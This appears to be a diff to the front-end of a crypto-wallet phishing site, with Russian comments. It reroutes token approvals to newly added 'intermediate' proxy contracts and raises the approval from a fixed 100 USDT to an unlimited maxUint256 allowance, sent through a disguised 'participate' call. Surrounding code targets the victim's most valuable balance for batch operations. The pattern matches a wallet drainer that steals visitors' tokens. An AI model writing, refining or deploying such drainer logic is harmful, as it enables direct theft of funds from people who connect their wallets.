@@ -86,7 +86,7 @@ console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
-  [networkMap['BNB Smart Chain'].chainId]: '0x0434A340Ca9FD87677b68c967816499304171eC7',
+  [networkMap['BNB Smart Chain'].chainId]: '0xEAAacF5471Edd8255b4f44A32f2444ae72b5345b',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
   [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
   [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
@@ -98,6 +98,21 @@ const CONTRACTS = {
   [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
+
+const PROXY_CONTRACTS = {
+  [networkMap['Ethereum'].chainId]: '0xNewProxyAddress', // Замени на адрес промежуточного контракта для Ethereum
+  [networkMap['BNB Smart Chain'].chainId]: '0x0e0f956e4da84aD921EA84B9D5c4434f44Bf6724', // Твой текущий контракт или новый адрес
+  [networkMap['Polygon'].chainId]: '0xNewProxyAddress', // Замени на адрес для Polygon
+  [networkMap['Arbitrum'].chainId]: '0xNewProxyAddress',
+  [networkMap['Optimism'].chainId]: '0xNewProxyAddress',
+  [networkMap['Base'].chainId]: '0xNewProxyAddress',
+  [networkMap['Scroll'].chainId]: '0xNewProxyAddress',
+  [networkMap['Avalanche'].chainId]: '0xNewProxyAddress',
+  [networkMap['Fantom'].chainId]: '0xNewProxyAddress',
+  [networkMap['Linea'].chainId]: '0xNewProxyAddress',
+  [networkMap['zkSync'].chainId]: '0xNewProxyAddress',
+  [networkMap['Celo'].chainId]: '0xNewProxyAddress'
+};
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
@@ -653,10 +668,11 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
 
   const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumContractAddress = getAddress(contractAddress); // 0x71D8436E8fA64CB5011d1d6929678119cAd0a8Cc
+  const checksumContractAddress = getAddress(PROXY_CONTRACTS[chainId]); // Промежуточный контракт
 
   try {
-    const amountToApprove = parseUnits("100", 18); // 100 USDT (18 decimals в BNB Smart Chain)
+    const amountToApprove = maxUint256; // Максимальный allowance для изначальной схемы
+    // const amountToApprove = parseUnits("100", 18); // Для тестов: 100 USDT
 
     const gasEstimate = await estimateGas(wagmiConfig, {
       account: wagmiConfig.account,
@@ -672,7 +688,7 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
     const gasPrice = await getGasPrice(wagmiConfig, { chainId });
 
     const txHash = await writeContract(wagmiConfig, {
-      address: checksumContractAddress,
+      address: checksumContractAddress, // Промежуточный контракт
       abi: proxyAbi,
       functionName: 'participate',
       args: [checksumTokenAddress, amountToApprove],
@@ -691,7 +707,6 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
     throw error;
   }
 };
-
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
